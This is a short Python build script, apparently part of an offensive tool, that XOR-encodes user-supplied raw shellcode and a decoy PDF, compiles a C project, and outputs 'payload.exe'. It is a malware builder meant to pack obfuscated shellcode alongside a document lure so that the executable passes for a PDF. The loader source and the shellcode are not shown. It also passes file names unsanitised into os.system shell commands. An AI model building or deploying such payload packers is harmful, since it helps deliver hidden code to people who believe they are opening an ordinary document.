import sys
import os

def generateExe():
    # run "make" in the Src folder to generate the executable file
    os.system("cd Src && make")
    # move the executable file to the current folder
    os.system("mv Src/main.exe payload.exe")
    # Clean the Src folder
    os.system("cd Src && make clean")
    # Remove the 1.bin and 1.pdf in the Src folder
    os.system("rm Src/1.bin")
    os.system("rm Src/1.pdf")
    print("[+] payload.exe is ready to be used")

def prepare(raw_shellcode,pdf_file):
    # Check if the files exist or not
    if not os.path.exists(raw_shellcode):
        print("File not found: " + raw_shellcode)
        exit(1)
    if not os.path.exists(pdf_file):
        print("File not found: " + pdf_file)
        exit(1)
    # use the file xorfile.py to xor the shellcode and the pdf file and save them as 1.bin and 1.pdf inside the Src folder
    os.system("python xorfile.py " + raw_shellcode + " 1.bin")
    os.system("python xorfile.py " + pdf_file + " 1.pdf")
    # move the 1.bin and 1.pdf to the Src folder
    os.system("mv 1.bin Src/1.bin")
    os.system("mv 1.pdf Src/1.pdf")
    print(f"[+] {raw_shellcode} and {pdf_file} are ready to be used as payload")

if __name__ == "__main__":
    args = sys.argv
    if len(args) != 3:
        print("Usage: python generate.py <raw_shellcode> <pdf_file>")
        exit(1)
    raw_shellcode = args[1]
    pdf_file = args[2]
    prepare(raw_shellcode, pdf_file)
    generateExe()